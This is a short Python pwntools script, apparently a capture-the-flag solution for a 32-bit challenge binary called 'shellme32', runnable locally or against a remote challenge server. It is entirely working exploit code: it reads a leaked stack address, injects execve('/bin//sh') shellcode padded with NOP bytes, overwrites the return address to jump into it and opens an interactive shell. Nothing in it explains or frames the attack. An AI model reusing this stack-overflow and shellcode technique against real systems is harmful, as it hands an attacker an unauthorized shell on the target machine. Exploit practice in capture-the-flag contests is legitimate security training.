from pwn import *
import sys

def exploit(p):
	padding = 40
	p.recvuntil('?\n')
	buff = int(p.recvline()[:-1], 16)
	print hex(buff)

	shellcode = asm("""
	xor    eax, eax
	push   eax
	push   0x68732f2f
	push   0x6e69622f
	mov    ebx, esp
	push   eax
	xor	   ecx, ecx
	xor	   edx, edx
	mov    al, 0xb
	int    0x80
	""")

	payload = ''
	payload += shellcode 
	payload += '\x90' * (padding - len(payload))
	payload += p32(buff)

	# gdb.attach(p, """
	# 			brva *0x127d
	# 			""")

	p.sendline(payload)
	p.interactive()

if __name__ == "__main__":
    if len(sys.argv) < 2:
        log.info("Argument needed!")
        log.info("Usage: python {} <local/remote>".format(sys.argv[0]))
        sys.exit(0)
    elif sys.argv[1] == "local":
        p = process("./shellme32")
        exploit(p)
    elif sys.argv[1] == "remote":
        p = remote("chal.tuctf.com", 30506)
        exploit(p)
    else:
        sys.exit(0)